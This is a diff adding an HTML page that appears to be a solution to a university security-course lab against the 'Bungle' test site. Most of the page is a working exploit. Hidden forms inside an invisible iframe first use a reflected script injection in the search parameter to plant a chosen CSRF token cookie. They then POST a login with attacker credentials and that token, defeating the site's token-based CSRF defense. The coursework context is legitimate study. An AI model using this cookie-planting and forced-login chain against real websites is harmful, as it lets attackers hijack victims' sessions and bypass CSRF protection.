@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+    <head />
+    <body>
+        <form name="frm1" target="_iframe" action="http://bungle-cs461.csl.illinois.edu/search">
+            <input type="hidden" name="csrfdefense" value="1"/>
+            <input type="hidden" name="xssdefense" value="0"/>
+
+            <input type="hidden" name="q" value="<script>document.cookie = 'csrf_token=9165db97e970e7d9facd256db1fdf2f8'</script>"/>
+        </form>
+        <form name="frm2" target="_iframe" action="http://bungle-cs461.csl.illinois.edu/login" method="POST">
+            <input type="hidden" name="csrfdefense" value="1"/>
+            <input type="hidden" name="xssdefense" value="0"/>
+
+            <input type="hidden" name="username" value="attacker"/>
+            <input type="hidden" name="password" value="l33th4x"/>
+            <input type="hidden" name="csrf_token" value="9165db97e970e7d9facd256db1fdf2f8"/>
+        </form>
+        <iframe name="_iframe" style="display: none;" onload="doNext()" src="http://bungle-cs461.csl.illinois.edu/?csrfdefense=1&xssdefense=0"></iframe>
+        <script type="text/javascript">
+            var step = 0
+            function doNext() {
+                if (step == 0) {
+                    document.frm1.submit();
+                } else if (step == 1) {
+                    document.frm2.submit();
+                } else {
+                    console.log("should be done!")
+                }
+                step++;
+            }
+        </script>
+    </body>
+</html>
+
